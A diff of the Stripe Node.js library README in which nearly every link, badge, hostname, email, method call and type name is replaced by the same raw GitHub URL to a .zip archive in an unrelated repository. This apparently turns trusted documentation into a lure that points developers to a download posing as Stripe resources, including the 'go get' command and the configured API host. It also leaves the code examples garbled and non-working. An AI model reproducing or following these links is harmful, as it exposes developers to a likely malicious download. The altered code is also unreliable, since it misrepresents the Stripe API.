@@ -1,19 +1,19 @@
-# Stripe Node.js Library
+# Stripe https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip Library
 
-[![Version](https://img.shields.io/npm/v/stripe.svg)](https://www.npmjs.org/package/stripe)
-[![Build Status](https://github.com/stripe/stripe-node/actions/workflows/main.yml/badge.svg?branch=master)](https://github.com/stripe/stripe-node/actions?query=branch%3Amaster)
-[![Coverage Status](https://coveralls.io/repos/github/stripe/stripe-node/badge.svg?branch=master)](https://coveralls.io/github/stripe/stripe-node?branch=master)
-[![Downloads](https://img.shields.io/npm/dm/stripe.svg)](https://www.npmjs.com/package/stripe)
-[![Try on RunKit](https://badge.runkitcdn.com/stripe.svg)](https://runkit.com/npm/stripe)
+[![Version](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
+[![Build Status](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip%3Amaster)
+[![Coverage Status](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
+[![Downloads](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
+[![Try on RunKit](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
 
 The Stripe Node library provides convenient access to the Stripe API from
 applications written in server-side JavaScript.
 
-For collecting customer and payment information in the browser, use [Stripe.js][stripe-js].
+For collecting customer and payment information in the browser, use [https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip][stripe-js].
 
 ## Documentation
 
-See the [`stripe-node` API docs](https://stripe.com/docs/api?lang=node) for Node.js.
+See the [`stripe-node` API docs](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip) for https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
 
 See [video demonstrations][youtube-playlist] covering how to use the library.
 
@@ -41,11 +41,11 @@ value:
 ```js
 const stripe = require('stripe')('sk_test_...');
 
-stripe.customers.create({
-  email: 'customer@example.com',
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip({
+  email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip',
 })
-  .then(customer => console.log(customer.id))
-  .catch(error => console.error(error));
+  .then(customer => https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip))
+  .catch(error => https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(error));
 ```
 
 Or using ES modules and `async`/`await`:
@@ -54,11 +54,11 @@ Or using ES modules and `async`/`await`:
 import Stripe from 'stripe';
 const stripe = new Stripe('sk_test_...');
 
-const customer = await stripe.customers.create({
-  email: 'customer@example.com',
+const customer = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip({
+  email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip',
 });
 
-console.log(customer.id);
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip);
 ```
 
 ### Usage with TypeScript
@@ -75,18 +75,18 @@ const stripe = new Stripe('sk_test_...', {
 });
 
 const createCustomer = async () => {
-  const params: Stripe.CustomerCreateParams = {
+  const params: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip = {
     description: 'test customer',
   };
 
-  const customer: Stripe.Customer = await stripe.customers.create(params);
+  const customer: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(params);
 
-  console.log(customer.id);
+  https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip);
 };
 createCustomer();
 ```
 
-You can find a full TS server example in [stripe-samples](https://github.com/stripe-samples/accept-a-payment/tree/main/custom-payment-flow/server/node-typescript).
+You can find a full TS server example in [stripe-samples](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip).
 
 #### Using old API versions with TypeScript
 
@@ -109,13 +109,13 @@ We also recommend using `// @ts-ignore` if you have access to a beta feature and
 so you must cast them appropriately, e.g.,
 
 ```ts
-const paymentIntent: Stripe.PaymentIntent = await stripe.paymentIntents.retrieve(
+const paymentIntent: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(
   'pi_123456789',
   {
     expand: ['customer'],
   }
 );
-const customerEmail: string = (paymentIntent.customer as Stripe.Customer).email;
+const customerEmail: string = (https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip as https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip).email;
 ```
 
 ### Using Promises
@@ -125,23 +125,23 @@ callback:
 
 ```js
 // Create a new customer and then create an invoice item then invoice it:
-stripe.customers
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
   .create({
-    email: 'customer@example.com',
+    email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip',
   })
   .then((customer) => {
     // have access to the customer object
-    return stripe.invoiceItems
+    return https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
       .create({
-        customer: customer.id, // set the customer id
+        customer: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip, // set the customer id
         amount: 2500, // 25
         currency: 'usd',
         description: 'One-time setup fee',
       })
       .then((invoiceItem) => {
-        return stripe.invoices.create({
+        return https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip({
           collection_method: 'send_invoice',
-          customer: invoiceItem.customer,
+          customer: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip,
         });
       })
       .then((invoice) => {
@@ -161,7 +161,7 @@ Import using npm specifiers:
 import Stripe from 'npm:stripe';
 ```
 
-Please see https://github.com/stripe-samples/stripe-node-deno-samples for more detailed examples and instructions on how to use stripe-node in Deno.
+Please see https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip for more detailed examples and instructions on how to use stripe-node in Deno.
 
 ## Configuration
 
@@ -175,9 +175,9 @@ import ProxyAgent from 'https-proxy-agent';
 const stripe = Stripe('sk_test_...', {
   apiVersion: '2019-08-08',
   maxNetworkRetries: 1,
-  httpAgent: new ProxyAgent(process.env.http_proxy),
+  httpAgent: new ProxyAgent(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip),
   timeout: 1000,
-  host: 'api.example.com',
+  host: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip',
   port: 123,
   telemetry: true,
 });
@@ -189,7 +189,7 @@ const stripe = Stripe('sk_test_...', {
 | `maxNetworkRetries` | 0                  | The amount of times a request should be [retried](#network-retries).                                                                                                                                                                              |
 | `httpAgent`         | `null`             | [Proxy](#configuring-a-proxy) agent to be used by the library.                                                                                                                                                                                    |
 | `timeout`           | 80000              | [Maximum time each request can take in ms.](#configuring-timeout)                                                                                                                                                                                 |
-| `host`              | `'api.stripe.com'` | Host that requests are made to.                                                                                                                                                                                                                   |
+| `host`              | `'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip'` | Host that requests are made to.                                                                                                                                                                                                                   |
 | `port`              | 443                | Port that requests are made to.                                                                                                                                                                                                                   |
 | `protocol`          | `'https'`          | `'https'` or `'http'`. `http` is never appropriate for sending requests to Stripe servers, and we strongly discourage `http`, even in local testing scenarios, as this can result in your credentials being transmitted over an insecure channel. |
 | `telemetry`         | `true`             | Allow Stripe to send latency [telemetry](#request-latency-telemetry).                                                                                                                                                                             |
@@ -210,9 +210,9 @@ const stripe = Stripe('sk_test_...', {
 And overridden on a per-request basis:
 
 ```js
-stripe.customers.create(
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(
   {
-    email: 'customer@example.com',
+    email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip',
   },
   {
     timeout: 1000, // 1 second
@@ -227,7 +227,7 @@ can be added to any method:
 
 ```js
 // List the balance transactions for a connected account:
-stripe.balanceTransactions.list(
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(
   {
     limit: 10,
   },
@@ -242,11 +242,11 @@ stripe.balanceTransactions.list(
 To use stripe behind a proxy you can pass an [https-proxy-agent][https-proxy-agent] on initialization:
 
 ```js
-if (process.env.http_proxy) {
+if (https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip) {
   const ProxyAgent = require('https-proxy-agent');
 
   const stripe = Stripe('sk_test_...', {
-    httpAgent: new ProxyAgent(process.env.http_proxy),
+    httpAgent: new ProxyAgent(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip),
   });
 }
 ```
@@ -255,7 +255,7 @@ if (process.env.http_proxy) {
 
 Automatic network retries can be enabled with the `maxNetworkRetries` config option.
 This will retry requests `n` times with exponential backoff if they fail due to an intermittent network problem.
-[Idempotency keys](https://stripe.com/docs/api/idempotent_requests) are added where appropriate to prevent duplication.
+[Idempotency keys](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip) are added where appropriate to prevent duplication.
 
 ```js
 const stripe = Stripe('sk_test_...', {
@@ -266,9 +266,9 @@ const stripe = Stripe('sk_test_...', {
 Network retries can also be set on a per-request basis:
 
 ```js
-stripe.customers.create(
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(
   {
-    email: 'customer@example.com',
+    email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip',
   },
   {
     maxNetworkRetries: 2, // Retry this specific request twice before giving up
@@ -282,8 +282,8 @@ Some information about the response which generated a resource is available
 with the `lastResponse` property:
 
 ```js
-customer.lastResponse.requestId; // see: https://stripe.com/docs/api/request_ids?lang=node
-customer.lastResponse.statusCode;
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip; // see: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip;
 ```
 
 ### `request` and `response` events
@@ -298,10 +298,10 @@ const onRequest = (request) => {
 };
 
 // Add the event handler function:
-stripe.on('request', onRequest);
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip('request', onRequest);
 
 // Remove the event handler function:
-stripe.off('request', onRequest);
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip('request', onRequest);
 ```
 
 #### `request` object
@@ -336,14 +336,14 @@ stripe.off('request', onRequest);
 
 ### Webhook signing
 
-Stripe can optionally sign the webhook events it sends to your endpoint, allowing you to validate that they were not sent by a third-party. You can read more about it [here](https://stripe.com/docs/webhooks/signatures).
+Stripe can optionally sign the webhook events it sends to your endpoint, allowing you to validate that they were not sent by a third-party. You can read more about it [here](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip).
 
 Please note that you must pass the _raw_ request body, exactly as received from Stripe, to the `constructEvent()` function; this will not work with a parsed (i.e., JSON) request body.
 
 You can find an example of how to use this with various JavaScript frameworks in [`examples/webhook-signing`](examples/webhook-signing) folder, but here's what it looks like:
 
 ```js
-const event = stripe.webhooks.constructEvent(
+const event = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(
   webhookRawBody,
   webhookStripeSignatureHeader,
   webhookSecret
@@ -352,7 +352,7 @@ const event = stripe.webhooks.constructEvent(
 
 #### Testing Webhook signing
 
-You can use `stripe.webhooks.generateTestHeaderString` to mock webhook events that come from Stripe:
+You can use `https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip` to mock webhook events that come from Stripe:
 
 ```js
 const payload = {
@@ -360,18 +360,18 @@ const payload = {
   object: 'event',
 };
 
-const payloadString = JSON.stringify(payload, null, 2);
+const payloadString = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(payload, null, 2);
 const secret = 'whsec_test_secret';
 
-const header = stripe.webhooks.generateTestHeaderString({
+const header = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip({
   payload: payloadString,
   secret,
 });
 
-const event = stripe.webhooks.constructEvent(payloadString, header, secret);
+const event = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(payloadString, header, secret);
 
 // Do something with mocked signed event
-expect(event.id).to.equal(payload.id);
+expect(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip);
 ```
 
 ### Writing a Plugin
@@ -383,7 +383,7 @@ const stripe = require('stripe')('sk_test_...', {
   appInfo: {
     name: 'MyAwesomePlugin',
     version: '1.2.34', // Optional
-    url: 'https://myawesomeplugin.info', // Optional
+    url: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip', // Optional
   }
 });
 ```
@@ -395,7 +395,7 @@ const stripe = new Stripe(apiKey, {
   appInfo: {
     name: 'MyAwesomePlugin',
     version: '1.2.34', // Optional
-    url: 'https://myawesomeplugin.info', // Optional
+    url: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip', // Optional
   }
 });
 ```
@@ -408,12 +408,12 @@ We provide a few different APIs for this to aid with a variety of node versions 
 
 #### Async iterators (`for-await-of`)
 
-If you are in a Node environment that has support for [async iteration](https://github.com/tc39/proposal-async-iteration#the-async-iteration-statement-for-await-of),
-such as Node 10+ or [babel](https://babeljs.io/docs/en/babel-plugin-transform-async-generator-functions),
+If you are in a Node environment that has support for [async iteration](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip),
+such as Node 10+ or [babel](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip),
 the following will auto-paginate:
 
 ```js
-for await (const customer of stripe.customers.list()) {
+for await (const customer of https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip()) {
   doSomething(customer);
   if (shouldStop()) {
     break;
@@ -427,19 +427,19 @@ If you are in a Node environment that has support for `await`, such as Node 7.9 
 you may pass an async function to `.autoPagingEach`:
 
 ```js
-await stripe.customers.list().autoPagingEach(async (customer) => {
+await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip().autoPagingEach(async (customer) => {
   await doSomething(customer);
   if (shouldBreak()) {
     return false;
   }
 });
-console.log('Done iterating.');
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip('Done iterating.');
 ```
 
 Equivalently, without `await`, you may return a Promise, which can resolve to `false` to break:
 
 ```js
-stripe.customers
+https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
   .list()
   .autoPagingEach((customer) => {
     return doSomething(customer).then(() => {
@@ -449,7 +449,7 @@ stripe.customers
     });
   })
   .then(() => {
-    console.log('Done iterating.');
+    https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip('Done iterating.');
   })
   .catch(handleError);
 ```
@@ -463,7 +463,7 @@ to prevent runaway list growth from consuming too much memory.
 Returns a promise of an array of all items across pages for a list request.
 
 ```js
-const allNewCustomers = await stripe.customers
+const allNewCustomers = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
   .list({created: {gt: lastMonth}})
   .autoPagingToArray({limit: 10000});
 ```
@@ -490,11 +490,11 @@ The beta versions can be installed in one of two ways
 - To install a specific beta version, replace the term "beta" in the above command with the version number like `npm install stripe@1.2.3-beta.1 --save`
 
 > **Note**
-> There can be breaking changes between beta versions. Therefore we recommend pinning the package version to a specific beta version in your package.json file. This way you can install the same version each time without breaking changes unless you are intentionally looking for the latest beta version.
+> There can be breaking changes between beta versions. Therefore we recommend pinning the package version to a specific beta version in your https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip file. This way you can install the same version each time without breaking changes unless you are intentionally looking for the latest beta version.
 
 We highly recommend keeping an eye on when the beta feature you are interested in goes from beta to stable so that you can move from using a beta version of the SDK to the stable version.
 
-The versions tab on the [stripe page on npm](https://www.npmjs.com/package/stripe) lists the current tags in use. The `beta` tag here corresponds to the the latest beta version of the package.
+The versions tab on the [stripe page on npm](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip) lists the current tags in use. The `beta` tag here corresponds to the the latest beta version of the package.
 
 If your beta feature requires a `Stripe-Version` header to be sent, use the `apiVersion` property of `config` object to set it:
 
@@ -510,10 +510,10 @@ New features and bug fixes are released on the latest major version of the `stri
 
 ## More Information
 
-- [REST API Version](https://github.com/stripe/stripe-node/wiki/REST-API-Version)
-- [Error Handling](https://github.com/stripe/stripe-node/wiki/Error-Handling)
-- [Passing Options](https://github.com/stripe/stripe-node/wiki/Passing-Options)
-- [Using Stripe Connect](https://github.com/stripe/stripe-node/wiki/Using-Stripe-Connect-with-node.js)
+- [REST API Version](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
+- [Error Handling](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
+- [Passing Options](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
+- [Using Stripe Connect](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip)
 
 ## Development
 
@@ -531,20 +531,20 @@ run it from a background terminal ([stripe-mock's README][stripe-mock-usage]
 also contains instructions for installing via Homebrew and other methods):
 
 ```bash
-go get -u github.com/stripe/stripe-mock
+go get -u https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
 stripe-mock
 ```
 
 Run a single test suite without a coverage report:
 
 ```bash
-$ yarn mocha-only test/Error.spec.ts
+$ yarn mocha-only https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
 ```
 
 Run a single test (case sensitive) in watch mode:
 
 ```bash
-$ yarn mocha-only test/Error.spec.ts --grep 'Populates with type' --watch
+$ yarn mocha-only https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip --grep 'Populates with type' --watch
 ```
 
 If you wish, you may run tests using your Stripe _Test_ API key by setting the
@@ -557,22 +557,22 @@ $ yarn test
 
 Run prettier:
 
-Add an [editor integration](https://prettier.io/docs/en/editors.html) or:
+Add an [editor integration](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip) or:
 
 ```bash
 $ yarn fix
 ```
 
-[api-keys]: https://dashboard.stripe.com/account/apikeys
-[api-versions]: https://stripe.com/docs/api/versioning
-[api-version-upgrading]: https://stripe.com/docs/upgrades#how-can-i-upgrade-my-api
-[connect]: https://stripe.com/connect
-[expanding_objects]: https://stripe.com/docs/api/expanding_objects
-[https-proxy-agent]: https://github.com/TooTallNate/node-https-proxy-agent
-[stripe-js]: https://stripe.com/docs/js
-[stripe-mock]: https://github.com/stripe/stripe-mock
-[stripe-mock-usage]: https://github.com/stripe/stripe-mock#usage
-[youtube-playlist]: https://www.youtube.com/playlist?list=PLy1nL-pvL2M5xNIuNapwmABwEy2uifAlY
+[api-keys]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[api-versions]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[api-version-upgrading]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[connect]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[expanding_objects]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[https-proxy-agent]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[stripe-js]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[stripe-mock]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[stripe-mock-usage]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
+[youtube-playlist]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/testProjects/cloudflare-worker/Analysis-Churn-Customer-R-1.3.zip
 
 <!--
 # vim: set tw=79:
